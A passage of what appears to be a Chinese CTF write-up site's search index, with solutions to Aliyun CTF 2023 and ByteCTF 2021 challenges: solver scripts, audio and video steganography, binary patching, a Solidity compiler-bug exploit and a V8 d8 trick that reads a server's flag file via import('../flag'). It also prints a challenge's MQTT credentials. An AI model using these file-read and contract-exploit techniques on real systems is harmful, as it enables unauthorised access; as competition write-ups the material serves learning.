array_unit(tree)\n    if len(tree.children) == 3:\n        if tree.children[1].value == \"+\":\n            return expr_sc(tree.children[0]) + expr_sc(tree.children[2])\n        elif tree.children[1].value == \"-\":\n            return expr_sc(tree.children[0]) - expr_sc(tree.children[2])\n        elif tree.children[1].value == \"*\":\n            return expr_sc(tree.children[0]) * expr_sc(tree.children[2])\n        elif tree.children[1].value == \"/\":\n            return expr_sc(tree.children[0]) // expr_sc(tree.children[2])\n    elif tree.data == \"arrayunit\":\n        return array_unit(tree)\n    else:\n        return expr_sc(tree.children[0])\n\ndef def_sc(tree):\n    if len(tree.children) == 2:\n        var[tree.children[1].value] = \"unknown\"\n    elif isinstance(tree.children[2], Token):\n        var[tree.children[1].value] = int(tree.children[2].value)\n    else:\n        a = \"unknown\"\n        for child in tree.children[2:][::-1]:\n            if a == \"unknown\":\n                a = [a for i in range(expr_sc(child))]\n            else:\n                a = [a[:] for i in range(expr_sc(child))]\n        arr[tree.children[1].value] = a\n\ndef array_sc(tree):\n    child1 = tree.children[0]\n    child2 = tree.children[1]\n    child3 = tree.children[2]\n    if isinstance(child1, Token):\n        if child3.data == \"expr\":\n            var[child1.value] = expr_sc(child3)\n        else:\n            var[child1.value] = array_unit(child3)\n    else:\n        array_unit_write(child1, expr_sc(child3))\n\ndef run_sc(tree):\n    if tree.data == \"prog\":\n        for child in tree.children:\n            run_sc(child)\n    elif tree.data == \"deflist\":\n        for child in tree.children:\n            def_sc(child)\n    elif tree.data == \"arrlist\":\n        for child in tree.children:\n            array_sc(child)\n\np.recvuntil(b\"!\\n\")\n\nfor rnd in range(300):\n    print(f\"[*] round #{rnd}\")\n    p.recvuntil(b\"!\")\n    code = p.recvuntil(b\"Your\", drop=True).decode().strip()\n    var = {}\n    arr = {}\n    tree = parser.parse(code)\n    try:\n        run_sc(tree)\n    except IndexError:\n        print(f\"[+] oob detected\")\n        p.sendlineafter(b\"):\", b\"oob\")\n    except (KeyError, ZeroDivisionError):\n        print(f\"[+] unknown detected\")\n        p.sendlineafter(b\"):\", b\"unknown\")\n    else:\n        print(f\"[+] safe\")\n        p.sendlineafter(b\"):\", b\"safe\")\n\np.interactive()\n</code></pre> <p>flag: aliyunctf{0k_y0u_kn0w_h0w_to_analyse_Pr0gram}\u3002</p>"}, {"location": "writeups/aliyunctf2023/#_1", "title": "\u6d88\u5931\u7684\u7535\u6ce2", "text": "<p>\u4e00\u4e2a\u975e\u5e38\u5750\u7262\u7684\u8c1c\u8bed\u9898\u3002\u7ed9\u4e86\u4e00\u4e2a\u97f3\u9891\uff0c\u5305\u542b\u4e09\u957f\u4e09\u77ed\u4e00\u5171\u516d\u6bb5\uff0c\u6bcf\u4e00\u79cd\u957f\u5ea6\u7684\u6ce2\u5f62\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002Au \u91cc\u9762\u7f29\u653e\u53ef\u4ee5\u770b\u5230\uff1a</p> <p></p> <p>\u4e0d\u96be\u60f3\u5230\u4e00\u9ad8\u4e00\u4f4e\u662f 1 \u548c 0\uff0c\u53ef\u4ee5\u7528 python scipy.io.wavefile \u6765\u8bfb\u53d6\u6ce2\u5f62\u6570\u636e\uff0c\u7136\u540e\u7528 scipy.signal.argrelextrema \u6765\u627e\u5230\u6240\u6709\u6781\u503c\uff0c\u548c\u4e00\u4e2a\u9608\u503c\u6bd4\u8f83\uff0c\u9ad8\u4e86\u5c31\u662f 1 \u4f4e\u4e86\u5c31\u662f 0\u3002\u5904\u7406\u7ed3\u679c\u53ef\u4ee5\u53d1\u73b0\u6240\u6709 1 \u90fd\u662f\u4e09\u4e2a\u4e00\u8d77\u51fa\u73b0\uff0c0 \u90fd\u662f\u56db\u4e2a\u4e00\u8d77\u51fa\u73b0\uff0c\u6240\u4ee5\u4e09\u4e2a 1 \u66ff\u6362\u4e3a\u4e00\u4e2a 1\u3001\u56db\u4e2a 0 \u66ff\u6362\u4e3a\u4e00\u4e2a 0\uff0c\u6700\u540e\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a</p> <pre><code>import numpy as np\nfrom scipy.io import wavfile\nfrom scipy.signal import argrelextrema\n\nsample_rate, data = wavfile.read(\"OVUB7rdc9oH112Ve.wav\")\n\nsections = []\n\nsections.append(np.trim_zeros(data[50000:150000]))\nsections.append(np.trim_zeros(data[150000:230000]))\nsections.append(np.trim_zeros(data[230000:300000]))\nsections.append(np.trim_zeros(data[300000:370000]))\nsections.append(np.trim_zeros(data[370000:420000]))\nsections.append(np.trim_zeros(data[420000:]))\n\nfor i, section in enumerate(sections):\n    print(\"\".join([str(int(i)) for i in (section[argrelextrema(section, np.greater)[0]] &gt; 8000)]).replace(\"111\", \"1\").replace(\"0000\", \"0\"))\n\n\"\"\"\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n00101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010011111011100110110111101101111010100101101101001000010011101000110110011111100111011001100110011100010110000100100110001001100010100101111101001101000010100101100001101111100010110010111011001001111010101000101001101110100010010100101110101111000110110010110101001111010010100100110110011\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n0010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101000101010001010100010101010001101100011011000110110001101\n\"\"\"\n</code></pre> <p>\u8f6c\u4e3a ASCII \u53ef\u4ee5\u53d1\u73b0\u524d\u9762\u7684\u90fd\u662f *\uff0c\u5e94\u8be5\u662f\u6ca1\u6709\u7528\u7684\uff0c\u7b2c\u4e8c\u79cd\u77ed\u7684\u90fd\u662f 0x8d\uff0c\u7b2c\u4e00\u79cd 01 \u4e32\u5e94\u8be5\u662f\u4e3b\u8981\u4fe1\u606f\u3002</p> <p>\u7136\u540e\u8fd9\u91cc\u5361\u4e86\u4e00\u6574\u5929\uff0c\u5728 CyberChef \u91cc\u4e71\u8bd5\uff0c\u6700\u540e yyy \u7761\u89c9\u68a6\u5230\u4e86\u89e3\u6cd5\uff08x \u5728 CyberChef \u91cc\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>\u7b2c\u4e8c\u79cd 01 \u4e32\u5b8c\u5168\u6ca1\u6709\u7528\u5230\u3002\u5f88\u5947\u602a\u3002</p> <p>\u8fd9\u4e2a\u7ed3\u679c\u89e3\u91ca\u8d77\u6765\u5c31\u662f\u4e00\u4e2a\u963f\u91cc\u4e91\u7684 OSS \u5bf9\u8c61\u5b58\u50a8\uff0c\u4f4d\u7f6e\u5728\u676d\u5dde\uff0cbucket \u540d\u662f ALBB-iot2023\uff0c\u5bf9\u8c61\u662f OpYdCuMtkQ8Yjhm2\u3002\u4e8e\u662f\u8bbf\u95ee https://ALBB-iot2023.oss-cn-hangzhou.aliyuncs.com/OpYdCuMtkQ8Yjhm2\uff0c\u8df3\u8f6c\u5230\u4e86 D3CTF \u5e73\u53f0\u8349\uff0cwget \u4e00\u4e0b\uff0c\u91cc\u9762\u6709\u4e00\u4e2a base64\uff0c\u89e3\u7801\u4e00\u4e0b\u662f aliyunctf{you_are_a_jocker}\uff0c\u5047 flag\uff0cjoker \u8fd8\u5199\u9519\u4e86\uff08x</p> <p>\u6700\u540e\u8bd5\u51fa\u6765\u5176\u5b9e bucket \u662f iot2023\uff0cALBB \u53ea\u662f\u63d0\u793a\u662f\u963f\u91cc\u4e91\u7684\u5e94\u8be5\uff0c\u800c\u4e14\u963f\u91cc\u4e91 OSS bucket \u540d\u79f0\u5176\u5b9e\u4e0d\u5141\u8bb8\u662f\u5927\u5199\u3002\u8bbf\u95ee https://iot2023.oss-cn-hangzhou.aliyuncs.com/OpYdCuMtkQ8Yjhm2\uff0c\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0cfile \u4e00\u4e0b\u662f Mach-O \u6b63\u597d mac \u53ef\u4ee5\u8dd1\uff0c\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\uff1a</p> <pre><code>[1682249479.453][LK-0313] MQTT user calls aiot_mqtt_connect api, connect\n[1682249479.453][LK-032A] mqtt host: a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com\n[1682249479.453][LK-0317] user name: ncApIY2XV9NUIY4VpbGk&amp;a1eAwsBKddO\n[1682249479.453][LK-0318] password: 70C3EC7A5774AF26EADEA867686238A403EF7A17118ABCABF1B49A8153D897DA\nestablish tcp connection with server(host='a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com', port=[443])\nsuccess to establish tcp, fd=5\nlocal port: 61892\n[1682249479.487][LK-1000] establish mbedtls connection with server(host='a1eAwsBKddO.iot-as-mqtt.cn-shanghai.aliyuncs.com', port=[443])\n[1682249479.574][LK-1000] success to establish mbedtls connection, (cost 45329 bytes in total, max used 48297 bytes)\n[1682249479.601][LK-0313] MQTT connect success in 148 ms\nAIOT_MQTTEVT_CONNECT\n[1682249479.601][LK-0309] sub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n[1682249479.601][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/update\n\n[LK-030A] &gt; 7B 22 69 64 22 3A 22 31  22 7D                   | {\"id\":\"1\"}      \n\nsuback, res: -0x0000, packet id: 1, max qos: 1\nheartbeat response\n[1682249479.668][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n\n[LK-030A] &lt; 54 72 79 20 65 6E 74 65  72 69 6E 67 20 77 68 61 | Try entering wha\n[LK-030A] &lt; 74 20 79 6F 75 20 77 61  6E 74 EF BC 81 EF BC 81 | t you want......\n[LK-030A] &lt; EF BC 81                                         | ...             \n\npub, qos: 0, topic: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\npub, payload: Try entering what you want\uff01\uff01\uff01\n[1682249480.917][LK-0309] pub: /ext/notify\n\n[LK-030A] &lt; 7B 22 74 69 74 6C 65 22  3A 22 6B 69 63 6B 22 2C | {\"title\":\"kick\",\n[LK-030A] &lt; 22 63 6F 6E 74 65 6E 74  22 3A 22 4B 69 63 6B 65 | \"content\":\"Kicke\n[LK-030A] &lt; 64 20 62 79 20 74 68 65  20 73 61 6D 65 20 64 65 | d by the same de\n[LK-030A] &lt; 76 69 63 65 22 7D                                | vice\"}          \n\npub, qos: 0, topic: /ext/notify\npub, payload: {\"title\":\"kick\",\"content\":\"Kicked by the same device\"}\n[1682249480.917][LK-1000] mbedtls_ssl_recv error, res: -0x7880\n[1682249480.917][LK-1000] adapter_network_deinit\n</code></pre> <p>\u770b\u8d77\u6765\u5c31\u662f\u548c\u4e00\u4e2a\u963f\u91cc\u4e91\u7684 MQTT \u670d\u52a1\u8fdb\u884c\u901a\u4fe1\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u90fd\u6709\uff0c\u4e3b\u673a\u548c\u7aef\u53e3\u4e5f\u6709\u3002\u8fd9\u4e2a MQTT \u8fde\u63a5 subscribe \u4e86 /.../.../user/get\uff0cpublish \u5230 /.../.../user/update\u3002\u53d1\u9001\u4e86\u4e00\u4e2a <code>{\"id\":\"1\"}</code>\uff0c\u7136\u540e\u5f97\u5230\u4e86 <code>Try entering what you want</code>\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u53d1\u9001\u5176\u4ed6\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 python \u7684 sdk \u6765\u8fdb\u884c\u8fde\u63a5\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5 patch \u8fd9\u4e2a\u7a0b\u5e8f\u3002\u4f46\u662f IDA \u91cc\u9762 patch \u4f1a\u6709\u95ee\u9898\uff0c\u4e0d\u5982\u76f4\u63a5\u4fee\u6539\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u7684\u5185\u5bb9\u662f <code>{\"id\":\"1\"}</code> \u4ee5\u53ca\u53d1\u9001\u7684\u957f\u5ea6\uff0c\u4fee\u6539\u6210 <code>{\"id\":\"flag\"}</code> \u4e4b\u540e\u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a</p> <pre><code>...\n[1682249712.939][LK-0309] sub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n[1682249712.939][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/update\n\n[LK-030A] &gt; 7B 22 69 64 22 3A 22 66  6C 61 67 22 7D          | {\"id\":\"flag\"}   \n\nsuback, res: -0x0000, packet id: 1, max qos: 1\nheartbeat response\n[1682249712.999][LK-0309] pub: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\n\n[LK-030A] &lt; 61 6C 69 79 75 6E 63 74  66 7B 35 35 35 38 62 65 | aliyunctf{5558be\n[LK-030A] &lt; 32 65 32 38 36 66 65 62  65 39 62 61 35 34 63 37 | 2e286febe9ba54c7\n[LK-030A] &lt; 32 31 63 62 34 61 30 65  36 31 7D                | 21cb4a0e61}     \n\npub, qos: 0, topic: /a1eAwsBKddO/ncApIY2XV9NUIY4VpbGk/user/get\npub, payload: aliyunctf{5558be2e286febe9ba54c721cb4a0e61}\n</code></pre> <p>\u6240\u4ee5 flag: aliyunctf{5558be2e286febe9ba54c721cb4a0e61}\u3002</p> <p>\u6700\u540e\u603b\u7ed3\u4e00\u4e0b\uff0c\u8fd9\u9898\u6298\u78e8\u4e86\u65f6\u95f4\u6700\u4e45\uff0c\u6211\u89c9\u5f97\u6f0f\u6d1e\u4e5f\u4e0d\u5c0f\uff0c\u53eb\u5783\u573e\u9898\u597d\u50cf\u4e5f\u4e0d\u81f3\u4e8e\uff0c\u4f46\u786e\u5b9e\u50bb\u903c\uff08x\u3002\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u70b9\u6211\u8fd8\u4e0d\u660e\u767d\uff1a</p> <ul> <li>\u97f3\u9891\u91cc\u6bcf\u6761\u4e3a\u4ec0\u4e48\u8981\u91cd\u590d\u4e09\u6b21\uff0c\u4e3a\u4ec0\u4e48\u5f00\u5934\u4f1a\u6709\u4e00\u5806 ****\uff0c\u4e3a\u4ec0\u4e48\u540e\u4e09\u6761\u5185\u5bb9\u662f 0x8d8d8d8d \u7684\u4e00\u70b9\u7528\u90fd\u6ca1\u6709<ul> <li>\u6211\u89c9\u5f97\u53ef\u80fd\u662f\u67d0\u79cd\u901a\u8baf\u7684\u534f\u8bae\u4e4b\u7c7b\u7684\uff0c\u4f46\u662f\u6ca1\u6709\u627e\u5230</li> </ul> </li> <li>\u8fd9\u4e2a 01 \u4e32\u7684\u5904\u7406\u786e\u5b9e\u6709\u70b9\u8981\u8111\u6d1e\u7684\uff0c\u4e0d\u592a\u597d\uff0c\u5361\u4e86\u5f88\u957f\u65f6\u95f4\uff08\u4f46\u662f\u5982\u679c\u662f\u901a\u8baf\u534f\u8bae\u7684\u8981\u6c42\u90a3\u6211\u65e0\u8bdd\u53ef\u8bf4\uff09</li> <li>\u89e3\u51fa\u6765\u7684 ALBB-iot2023.oss.... \u7684\u5199\u6cd5\u771f\u7684\u5f88\u5bb9\u6613\u6df7\u6dc6\u7684\uff0c\u800c\u4e14\u5f97\u5230\u5047 flag \u4e4b\u540e\u5c31\u4f1a\u89c9\u5f97\u5df2\u7ecf\u6ca1\u6709\u53ef\u7528\u4fe1\u606f\u4e86<ul> <li>\u867d\u7136 bucket \u540d\u4e0d\u80fd\u5927\u5199\u8fd9\u4e2a\u95ee\u9898\u786e\u5b9e\u540e\u6765\u624d\u53d1\u73b0</li> </ul> </li> <li>MQTT \u534f\u8bae\u7684\u51fa\u73b0\u6709\u70b9\u7a81\u5140\uff0c\u50cf\u662f\u786c\u5957\u5a03+\u5ba3\u4f20\u963f\u91cc\u4e91\u4ea7\u54c1\uff0c\u800c\u4e14\u5df2\u6709\u5e93\u597d\u50cf\u90fd\u4e0d\u592a\u597d\u7528\uff0c\u8fd8\u662f\u76f4\u63a5 patch \u53ef\u6267\u884c\u6587\u4ef6\u65b9\u4fbf\uff0c\u4ee5\u53ca\u5230\u5e95\u8981 pub \u4ec0\u4e48\u4e5f\u8981\u731c\uff0c\u4e0d\u597d</li> </ul>"}, {"location": "writeups/aliyunctf2023/#happytree", "title": "HappyTree", "text": "<p>\u5176\u5b9e\u5c31\u662f\u4e00\u9053 ETH \u9898\uff0c\u5bc6\u7801\u5b66\u6210\u5206\u4e0d\u591a\u3002\u56db\u8001\u5e08\u505a\u7684\uff0c\u770b\u4e86\u4e00\u4e0b\u8fd8\u633a\u597d\u73a9\u7684\u3002</p> \u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Greeter {\n    uint256 public x;\n    uint256 public y;\n    bytes32 public root;\n    mapping(bytes32 =&gt; bool) public used_leafs;\n\n    constructor(bytes32 root_hash) {\n        root = root_hash;\n    }\n\n    modifier onlyGreeter() {\n        require(msg.sender == address(this));\n        _;\n    }\n\n    function g(bool a) internal returns (uint256, uint256) {\n        if (a) return (0, 1);\n        assembly {\n            return(0, 0)\n        }\n    }\n\n    function a(uint256 i, uint256 n) public onlyGreeter {\n        x = n;\n        g((n &lt;= 2));\n        x = i;\n    }\n\n    function b(\n        bytes32[] calldata leafs,\n        bytes32[][] calldata proofs,\n        uint256[] calldata indexs\n    ) public {\n        require(leafs.length == proofs.length, \"Greeter: length not equal\");\n        require(leafs.length == indexs.length, \"Greeter: length not equal\");\n\n        for (uint256 i = 0; i &lt; leafs.length; i++) {\n            require(\n                verify(proofs[i], leafs[i], indexs[i]),\n                \"Greeter: proof invalid\"\n            );\n            require(used_leafs[leafs[i]] == false, \"Greeter: leaf has be used\");\n            used_leafs[leafs[i]] = true;\n            this.a(i, y);\n            y++;\n        }\n    }\n\n    function verify(\n        bytes32[] memory proof,\n        bytes32 leaf,\n        uint256 index\n    ) internal view returns (bool) {\n        bytes32 hash = leaf;\n\n        for (uint256 i = 0; i &lt; proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n\n    function isSolved() public view returns (bool) {\n        return x == 2 &amp;&amp; y == 4;\n    }\n}\n</code></pre> <p>\u4ee5\u53ca\u7ed9\u4e86\u4e00\u4e9b\u5df2\u6709\u7684\u4fe1\u606f\uff1a</p> <pre><code>alice: 0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a\nBob:   0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6\nCalor: 0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d\nroot:  0xb57c9b430ecc5b184f7ab285b8c9ca898e3e528c4668d136ee0fab03ae716f86\n</code></pre> <p>\u8981\u505a\u7684\u5c31\u662f\u8c03\u7528 b \u51fd\u6570\uff0c\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8fd9\u65f6\u4f1a\u4fee\u6539 x \u548c y \u7684\u503c\uff0c\u6700\u7ec8\u8981\u4f7f\u5f97 x == 2 \u4e14 y == 4\u3002</p> <p>y == 4 \u7684\u8bdd\u4ece\u4ee3\u7801\u770b\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u5c31\u662f\u8981\u5728 b \u51fd\u6570\u91cc\u9762\u5faa\u73af\u9a8c\u8bc1\u56db\u7ec4\uff0c\u4f46\u8fd9\u6837\u7684\u8bdd x \u7684\u9884\u671f\u5c31\u5e94\u8be5\u662f 3\uff08\u56e0\u4e3a\u51fd\u6570 g \u91cc\u9762 assembly \u7684 return \u662f EVM \u7684 return \u5b57\u8282\u7801\uff0c\u6548\u679c\u662f\u76f4\u63a5\u8fd4\u56de\u6574\u4e2a\u8c03\u7528\uff0c\u800c\u4e0d\u662f\u8fd4\u56de\u5f53\u524d\u51fd\u6570\u8c03\u7528\uff09\u3002</p> <p>\u4f46\u662f\u8fd9\u4e2a\u5199\u6cd5\u5f88\u5947\u602a\uff0c\u641c\u7d22\u53ef\u4ee5\u641c\u5230 https://blog.soliditylang.org/2022/09/08/storage-write-removal-before-conditional-termination/\uff0c\u662f\u4e00\u4e2a bug\uff0c\u5728 0.8.17 \u7248\u672c\u4e4b\u524d\u7f16\u8bd1\u51fa\u6765\u7684\u7ed3\u679c\u4f1a\u5bfc\u81f4\u5982\u679c g \u91cc\u9762\u76f4\u63a5\u7ed3\u675f\u4ea4\u6613\u4e86\uff0c\u5176\u5b9e\u8fd9\u4e4b\u524d a \u51fd\u6570\u91cc\u9762\u4e4b\u524d\u7684 x \u7684\u4fee\u6539\u5e76\u4e0d\u4f1a\u53d1\u751f\uff0c\u5bfc\u81f4 x \u7684\u503c\u8fd8\u662f\u4e0a\u6b21\u5f97\u5230\u7684 2\u3002</p> <p>\u6240\u4ee5\u5176\u5b9e\u53ea\u8981\u63d0\u4f9b\u56db\u7ec4\u53ef\u4ee5\u9a8c\u8bc1\u7684 leafs proofs index \u5c31\u53ef\u4ee5\u4e86\u3002\u53ef\u4ee5\u5f97\u5230\uff1a</p> <pre><code>a = keccak256(abi.encodePacked(alice, bob)) = 0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e\nb = keccak256(abi.encodePacked(calor, calor)) = 0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486\n\u540c\u65f6\nkeccak256(abi.encodePacked(a, b)) == root\n</code></pre> <p>\u6240\u4ee5\u90a3\u4e48\u73b0\u5728\u5c31\u6709\u4e86\uff1a</p> <pre><code>root == root\nhash(a, b) == root\nhash(b, a) == root\nhash(hash(alice, bob), b) == hash(a, b) == root\n</code></pre> <p>\u8fd9\u56db\u7ec4\u5c31\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u4e86\u3002flag: aliyunctf{scuy6bart2dwep6smad2step6cust}</p>"}, {"location": "writeups/aliyunctf2023/#_2", "title": "\u61c2\u5f97\u90fd\u61c2\u5e26\u5e26\u5f1f\u5f1f", "text": "<p>\u6ca1\u6b63\u7ecf\u505a\u51fa\u6765\uff0c\u4e5f\u4e0d\u4f1a v8\uff0c\u4f46\u662f\u8fd9\u4e2a\u9898\u7684\u975e\u9884\u671f\u633a 6 \u7684\u6240\u4ee5\u8bb0\u5f55\u4e00\u4e0b\u3002</p> <p>\u4e00\u4e2a js v8 \u7684\u9898\uff0c\u5728\u6700\u65b0\u7248\u4e0a patch \u5220\u9664\u6389\u4e86 write\u3001read\u3001readbuffer\u3001readline\u3001load\u3001os \u7b49\u529f\u80fd\uff0c\u5e76\u4e14 revert \u4e86 commit 30e4ba6df4cdf5582de4d79850bcd270e6a75a7a\uff0c\u52a0\u56de\u6765\u4e86\u4e00\u4e9b\u4e4b\u524d\u5220\u6389\u7684\u5e8f\u5217\u5316\u7684\u529f\u80fd\u3002\u8981\u6c42\u662f\u4e0e\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684 d8 \u89e3\u91ca\u5668\u4ea4\u4e92\uff0c\u8bfb\u53d6\u5230\u670d\u52a1\u5668\u4e0a\u7684 flag\u3002</p> <p>\u8fd9\u9898\u7684\u975e\u9884\u671f\u5c31\u662f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 import() \u7136\u540e\u5bfc\u81f4\u52a0\u8f7d\u8fdb\u6765\u7684 flag \u5185\u5bb9\u8bed\u6cd5\u9519\u8bef\uff0c\u5728\u62a5\u9519\u4fe1\u606f\u4e2d\u76f4\u63a5\u6253\u51fa flag\uff1a</p> <pre><code>V8 version 11.4.117\nd8&gt; import(\"../flag\")\n/flag:1: SyntaxError: Unexpected token '{'\naliyunctf{woot_woot_thanks_for_closing_the_issue_hey_it_regressed_rEEOpENPLZhttps__github_com_nodejs_node_issues_18265_6144641bbe2c577a}\n         ^\nSyntaxError: Unexpected token '{'\n\n/flag:1: SyntaxError: Unexpected token '{'\naliyunctf{woot_woot_thanks_for_closing_the_issue_hey_it_regressed_rEEOpENPLZhttps__github_com_nodejs_node_issues_18265_6144641bbe2c577a}\n         ^\nSyntaxError: Unexpected token '{'\n\n[object Promise]\nd8&gt;\n</code></pre> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u770b\u5230\u9884\u671f\u505a\u6cd5\u5176\u5b9e\u662f\u53c2\u8003 https://github.com/nodejs/node/issues/18265\u3002</p>"}, {"location": "writeups/bytectf2021_final/", "title": "ByteCTF 2021 Final Writeup", "text": "<p> \u7ea6 496 \u4e2a\u5b57  58 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684</p>"}, {"location": "writeups/bytectf2021_final/#enrich-life", "title": "Enrich Life", "text": "<p>\u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a<code>FlagInChromaFrames</code>\uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf</p> <p>\u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38</p> <p>\u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f</p> <p>\u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nvideo = cv2.VideoCapture('enrich_life.mp4')\n\nn = 300\nx = [i for i in range(n*8)]\ny = []\nfor i in range(n*8):\n    _, frame = video.read()\n    frame = frame[:, :, :]\n    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2YUV)\n    Y, U, V = cv2.split(frame)\n    y.append(np.abs(np.average(V)))\n\nplt.figure(figsize=(64,16))\nplt.scatter(x, y, s=1)\nplt.show()\n\nprint(y)\n</code></pre> <p></p> <p>\u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a</p> <pre><code>import cv2\nimport numpy as np\nfrom Crypto.Util.number import *\nvideo = cv2.VideoCapture('enrich_life.mp4')\ny = np.reshape([np.abs(np.average(cv2.split(cv2.cvtColor(video.read()[1][:,:,:], cv2.COLOR_BGR2YUV))[2])) for _ in range(150*8)], (240,5))\nprint(long_to_bytes(int(\"\".join(['1' if y[i, 0] &lt; y[i, 1] else '0' for i in range(240)]), 2)))\n# b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a'\n</code></pre>"}, {"location": "writeups/bytectf2021_final/#fps_game", "title": "FPS_game", "text": "<p>\u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a</p> <p></p> <p>\u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002</p> <p></p>"}, {"location": "writeups/bytectf2021_final/#lisas-cat", "title": "Lisa's cat", "text": "<p>\u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247</p> <p>\u5728 green 0 